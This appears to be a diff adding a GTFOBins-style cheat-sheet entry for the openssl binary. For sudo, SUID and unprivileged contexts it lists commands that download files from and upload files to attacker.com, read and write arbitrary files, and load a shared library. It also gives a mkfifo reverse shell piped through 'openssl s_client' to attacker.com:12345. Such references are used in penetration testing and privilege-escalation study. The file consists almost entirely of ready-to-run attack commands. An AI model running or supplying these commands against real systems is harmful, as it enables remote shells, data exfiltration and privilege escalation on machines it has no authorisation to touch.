@@ -1,0 +1,89 @@
+openssl
+=======
+
+Download
+--------
+
+[Sudo]
+    openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
+
+[SUID]
+    openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
+
+[Unprivileged]
+    openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
+
+File read
+---------
+
+[Sudo]
+    openssl enc -in /path/to/input-file
+
+[SUID]
+    openssl enc -in /path/to/input-file
+
+[Unprivileged]
+    openssl enc -in /path/to/input-file
+
+File write
+----------
+
+[Sudo]
+    echo DATA | openssl enc -out /path/to/output-file
+
+[SUID]
+    echo DATA | openssl enc -out /path/to/output-file
+
+[Unprivileged]
+    echo DATA | openssl enc -out /path/to/output-file
+
+[Sudo]
+    openssl enc -in /path/to/input-file -out /path/to/output-file
+
+[SUID]
+    openssl enc -in /path/to/input-file -out /path/to/output-file
+
+[Unprivileged]
+    openssl enc -in /path/to/input-file -out /path/to/output-file
+
+Library load
+------------
+
+[Sudo]
+    openssl req -engine ./lib.so
+
+[SUID]
+    openssl req -engine ./lib.so
+
+[Unprivileged]
+    openssl req -engine ./lib.so
+
+Reverse shell
+-------------
+
+[Sudo]
+    mkfifo /path/to/temp-socket
+/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
+    The shell process is not spawn by `openssl`.
+
+[SUID]
+    mkfifo /path/to/temp-socket
+/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
+    The shell process is not spawn by `openssl`.
+
+[Unprivileged]
+    mkfifo /path/to/temp-socket
+/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
+    The shell process is not spawn by `openssl`.
+
+Upload
+------
+
+[Sudo]
+    openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
+
+[SUID]
+    openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
+
+[Unprivileged]
+    openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
